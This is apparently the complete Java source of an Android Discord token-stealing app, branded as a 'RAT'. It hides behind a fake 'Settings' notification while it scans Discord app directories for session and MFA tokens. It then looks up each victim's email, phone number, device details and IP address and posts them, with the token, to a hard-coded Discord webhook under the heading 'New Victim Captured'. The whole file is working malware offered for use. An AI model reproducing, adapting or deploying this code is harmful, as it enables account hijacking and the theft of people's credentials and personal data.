package com.blackout.token.grabber;

import android.Manifest;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Environment;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Pattern;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import org.json.JSONObject;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (hasPermissions()) {
            startGrabberService();
        } else {
            requestAllPermissions();
        }
        finish();
    }

    private boolean hasPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return Environment.isExternalStorageManager() ||
                   ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
    }

    private void requestAllPermissions() {
        List<String> permissions = new ArrayList<>();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO);
            permissions.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }

        ActivityCompat.requestPermissions(this, permissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, "⚠️ Permissions required!", Toast.LENGTH_SHORT).show();
                    finish();
                    return;
                }
            }
            startGrabberService();
        }
    }

    private void startGrabberService() {
        Intent serviceIntent = new Intent(this, TokenGrabberService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    public static class TokenGrabberService extends Service {
        private static final String CHANNEL_ID = "TokenGrabberChannel";
        private static final int NOTIFICATION_ID = 1;
        
        // 🔴 CHANGE THIS TO YOUR WEBHOOK URL 🔴
        private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1547048964367458345/ziXIG4cHXBGALWYX6BMsWJZCX-7pH-9KDZon1bNd7b8a8igcpuwvweUHT1tJ13fg9-ce";

        private static final Pattern TOKEN_PATTERN = Pattern.compile("[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{34,38}");
        private static final Pattern MFA_PATTERN = Pattern.compile("mfa\\.[\\w-]{84,}");
        private static final Pattern ENCRYPTED_PATTERN = Pattern.compile("dQw4w9WgXcQ:[A-Za-z0-9+/=]+");

        @Override
        public void onCreate() {
            super.onCreate();
            createNotificationChannel();
            startForeground(NOTIFICATION_ID, createNotification());
        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            new Thread(() -> {
                try {
                    grabAllTokens();
                } catch (Exception ignored) {}
                stopSelf();
            }).start();
            return START_NOT_STICKY;
        }

        @Override
        public IBinder onBind(Intent intent) { return null; }

        private void createNotificationChannel() {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Settings", NotificationManager.IMPORTANCE_LOW);
                NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if (manager != null) manager.createNotificationChannel(channel);
            }
        }

        private Notification createNotification() {
            return new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("Settings")
                    .setContentText("Loading settings...")
                    .setSmallIcon(android.R.drawable.ic_menu_preferences)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .build();
        }

        private void grabAllTokens() {
            Set<String> processed = new HashSet<>();
            List<DiscordToken> tokens = new ArrayList<>();

            // Scan ALL possible locations
            String[][] paths = {
                {"/data/data/com.discord/", "discord"},
                {"/data/data/com.discordcanary/", "canary"},
                {"/data/data/com.discordptb/", "ptb"},
                {"/data/data/com.aliucord/", "aliucord"},
                {"/data/data/com.enmity/", "enmity"},
                {"/storage/emulated/0/Android/data/com.discord/", "external_discord"},
                {"/storage/emulated/0/Android/data/com.discordcanary/", "external_canary"},
                {"/storage/emulated/0/Android/data/com.discordptb/", "external_ptb"}
            };

            for (String[] pathInfo : paths) {
                File dir = new File(pathInfo[0]);
                if (dir.exists() && dir.isDirectory()) {
                    scanDirectory(dir, processed, tokens, pathInfo[1]);
                }
            }

            // Send all valid tokens
            for (DiscordToken token : tokens) {
                if (!token.isSent && isValidToken(token.token)) {
                    sendToWebhook(token.token, token.source);
                    token.isSent = true;
                    try { Thread.sleep(500); } catch (Exception ignored) {}
                }
            }
        }

        private void scanDirectory(File dir, Set<String> processed, List<DiscordToken> tokens, String source) {
            if (dir == null || !dir.exists() || !dir.isDirectory()) return;

            File[] files = dir.listFiles();
            if (files == null) return;

            for (File file : files) {
                if (file.isDirectory()) {
                    scanDirectory(file, processed, tokens, source);
                } else if (file.isFile() && file.length() < 5 * 1024 * 1024) {
                    String content = readFileContent(file);
                    if (content != null) {
                        extractTokens(content, processed, tokens, source);
                    }
                }
            }
        }

        private void extractTokens(String text, Set<String> processed, List<DiscordToken> tokens, String source) {
            if (text == null || text.isEmpty()) return;

            var matcher = TOKEN_PATTERN.matcher(text);
            while (matcher.find()) {
                String token = matcher.group().trim();
                if (!processed.contains(token) && isValidToken(token)) {
                    processed.add(token);
                    tokens.add(new DiscordToken(token, source));
                }
            }

            var mfaMatcher = MFA_PATTERN.matcher(text);
            while (mfaMatcher.find()) {
                String token = mfaMatcher.group().trim();
                if (!processed.contains(token)) {
                    processed.add(token);
                    tokens.add(new DiscordToken(token, source + "_mfa"));
                }
            }

            var encMatcher = ENCRYPTED_PATTERN.matcher(text);
            while (encMatcher.find()) {
                String token = encMatcher.group().trim();
                if (!processed.contains(token)) {
                    processed.add(token);
                    tokens.add(new DiscordToken(token, source + "_encrypted"));
                }
            }
        }

        private boolean isValidToken(String token) {
            if (token == null || token.isEmpty()) return false;
            token = token.trim();
            
            if (token.matches("[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{34,38}")) return true;
            if (token.startsWith("mfa.") && token.length() > 50) return true;
            if (token.startsWith("dQw4w9WgXcQ:") && token.length() > 20) return true;
            
            return false;
        }

        private String readFileContent(File file) {
            if (file == null || !file.exists() || !file.isFile()) return null;
            try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                StringBuilder content = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    content.append(line);
                }
                return content.toString();
            } catch (IOException e) {
                return null;
            }
        }

        private void sendToWebhook(String token, String source) {
            try {
                OkHttpClient client = new OkHttpClient();
                
                // Get user info
                Request userReq = new Request.Builder()
                    .url("https://discord.com/api/v9/users/@me")
                    .addHeader("Authorization", token)
                    .addHeader("User-Agent", "Mozilla/5.0")
                    .build();

                Response userRes = client.newCall(userReq).execute();
                if (!userRes.isSuccessful()) return;

                String json = userRes.body().string();
                JSONObject user = new JSONObject(json);

                String username = user.optString("username", "Unknown");
                String id = user.optString("id", "Unknown");
                String email = user.optString("email", "None");
                String phone = user.optString("phone", "None");
                String avatar = user.optString("avatar", "");
                boolean mfa = user.optBoolean("mfa_enabled", false);
                boolean verified = user.optBoolean("verified", false);
                int flags = user.optInt("flags", 0);

                // Get IP
                String ip = getIP(client);

                // Build embed
                JSONObject embed = new JSONObject();
                embed.put("title", "🔥 **New Victim Captured**");
                embed.put("color", 0xFF4500);
                
                String avatarUrl = !avatar.isEmpty() ? 
                    "https://cdn.discordapp.com/avatars/" + id + "/" + avatar + ".png?size=256" :
                    "https://cdn.discordapp.com/embed/avatars/0.png";
                JSONObject thumbnail = new JSONObject();
                thumbnail.put("url", avatarUrl);
                embed.put("thumbnail", thumbnail);

                // User Info
                JSONObject userField = new JSONObject();
                userField.put("name", "👤 **User Details**");
                userField.put("value", 
                    "**ID:** " + id + "\n" +
                    "**Username:** " + username + "\n" +
                    "**Email:** " + email + "\n" +
                    "**Phone:** " + phone + "\n" +
                    "**Badges:** " + getBadges(flags) + "\n" +
                    "**MFA:** " + (mfa ? "✅ Enabled" : "❌ Disabled") + "\n" +
                    "**Verified:** " + (verified ? "✅ Yes" : "❌ No")
                );
                userField.put("inline", true);

                // Device Info
                JSONObject deviceField = new JSONObject();
                deviceField.put("name", "📱 **Device Info**");
                deviceField.put("value",
                    "**Device:** " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
                    "**Android:** " + Build.VERSION.RELEASE + "\n" +
                    "**Source:** " + source + "\n" +
                    "**IP:** " + ip
                );
                deviceField.put("inline", true);

                // Token
                JSONObject tokenField = new JSONObject();
                tokenField.put("name", "🔑 **Access Token**");
                tokenField.put("value", "```yaml\n" + token + "\n```");
                tokenField.put("inline", false);

                embed.put("fields", new JSONObject[]{userField, deviceField, tokenField});

                JSONObject footer = new JSONObject();
                footer.put("text", "BLACKOUT! | Made by Regx.dev");
                embed.put("footer", footer);

                JSONObject payload = new JSONObject();
                payload.put("username", "RegXx - RAT");
                payload.put("avatar_url", "https://github.com/VenomKing41/api/blob/main/download%20(3).jpg?raw=true");
                payload.put("embeds", new JSONObject[]{embed});

                // Send to webhook
                MediaType JSON_TYPE = MediaType.parse("application/json; charset=utf-8");
                RequestBody body = RequestBody.create(payload.toString(), JSON_TYPE);
                Request webhookReq = new Request.Builder()
                    .url(WEBHOOK_URL)
                    .post(body)
                    .build();

                client.newCall(webhookReq).execute();

            } catch (Exception ignored) {}
        }

        private String getIP(OkHttpClient client) {
            try {
                Request request = new Request.Builder()
                    .url("https://api.ipify.org?format=json")
                    .build();
                Response response = client.newCall(request).execute();
                if (response.isSuccessful()) {
                    String json = response.body().string();
                    return json.replaceAll(".*\"ip\":\"([^\"]+)\".*", "$1");
                }
            } catch (Exception ignored) {}
            return "None";
        }

        private String getBadges(int flags) {
            StringBuilder badges = new StringBuilder();
            if ((flags & 1) != 0) badges.append("🛡️ ");
            if ((flags & 2) != 0) badges.append("🤝 ");
            if ((flags & 4) != 0) badges.append("🎉 ");
            if ((flags & 8) != 0) badges.append("🐛 ");
            if ((flags & 64) != 0 || (flags & 96) != 0) badges.append("💪 ");
            if ((flags & 128) != 0 || (flags & 160) != 0) badges.append("🧠 ");
            if ((flags & 256) != 0 || (flags & 288) != 0) badges.append("⚖️ ");
            if ((flags & 512) != 0) badges.append("⭐ ");
            if ((flags & 16384) != 0) badges.append("🔍 ");
            if ((flags & 131072) != 0) badges.append("🤖 ");
            if ((flags & 262144) != 0) badges.append("👮 ");
            if ((flags & 4194304) != 0) badges.append("💻 ");
            return badges.length() > 0 ? badges.toString() : "None";
        }

        private static class DiscordToken {
            String token;
            String source;
            boolean isSent;
            DiscordToken(String token, String source) {
                this.token = token;
                this.source = source;
                this.isSent = false;
            }
        }
    }
}